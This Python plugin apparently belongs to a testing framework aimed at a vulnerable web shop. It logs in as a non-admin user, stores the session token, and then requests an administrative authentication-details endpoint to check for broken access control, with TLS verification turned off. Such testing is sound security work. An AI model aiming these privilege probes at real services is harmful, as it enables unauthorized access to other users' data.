"""
This file will create a login session using user that is not admin
It will then save the cookie to cookies.json
#################################################################3
Remark: You need to register a user before you run this code
Hint: You can use TASK REPETITIVE REGISTRATION
"""

from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from plugins import test_repetitive_registration as usrReg

class test_user_login_class(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/login'
        usr = usrReg.test_repetitive_registration()
        self.email, self.password, self.id = usr.run()

    def generator(self,):
        json_data = {
            'email': self.email,
            'password': self.password,
        }

        return json_data

    def run(self):
        print("--------------------------------------")
        print("Now let us login as a normal user ")
        json_data = self.generator()
        response = self.juice_session.post(self.url, json=json_data)
        print(response.status_code)
        if response.status_code == 200:
            new_token = response.json()["authentication"]['token']
            new_header = a.TEST_HEADER.copy()
            new_header["Authorization"] = "Bearer "+new_token
            new_cookie = a.TEST_COOKIE.copy()
            new_cookie["token"] = new_token
            a.write_cookie(self.email, new_cookie)
        print(response.text)
        print("user id is ")
        print(self.id)
        return response, new_cookie, new_header

    def second_login(self, new_cookie, new_header):
        print(a.TEST_COOKIE == new_cookie)
        print(a.TEST_HEADER == new_header)
        print("who am i")
        response = self.juice_session.get(a.URL + '/rest/user/whoami',
                                          cookies=new_cookie, headers=new_header, verify=False)
        print(response.status_code)
        print(response.text)
        print("let's see administration")
        print(new_cookie["token"])
        res = self.juice_session.get(a.URL + '/rest/user/authentication-details',
                                          cookies=new_cookie, headers=new_header, verify=False)
        print(res.text)
        print(res.status_code)